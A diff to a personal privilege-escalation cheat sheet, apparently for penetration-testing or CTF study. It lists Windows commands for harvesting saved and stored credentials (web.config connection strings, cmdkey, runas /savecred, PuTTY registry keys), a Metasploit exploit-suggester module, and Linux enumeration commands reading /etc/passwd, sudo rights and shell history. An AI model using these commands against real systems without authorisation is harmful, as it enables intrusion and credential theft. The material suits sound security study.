@@ -102,3 +102,22 @@ type C:\inetpub\wwwroot\web.config | findstr connectionString ~webserver configu
 cmdkey /list ~ saved credintials
 runas /savecred /user:[any cred] cmd.exe ~ use the results from the above command to spawn a shell
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s ~ gets stored putty credintials
+schtasks /query /tn vulntask /fo list /v ~ check for autorun tasks
+icacls [file path] ~ check for file permissions
+multi/recon/local_exploit_suggester ~ module to list vulnerabilities that may affect the target if you have a meterpreter session
+
+#linux priv
+hostname ~ hostname of target
+uname -a ~ kernel details
+cat /proc/version ~ kernel version
+cat /etc/issue ~ information about operating system
+ps aux ~ running processes for all users
+env ~ environmental variables
+sudo -l ~ list all commands your user can run using sudo
+ls -la ~ list hidden files in current directory
+id ~ user privilage level
+cat /etc/passwd | grep home ~ users on the system
+history ~ history of commands
+ifconfig ~ information about the network interfaces
+netstat -l ~ list ports in “listening” mode
+find ~ use it with the correct arguments to list files or directories
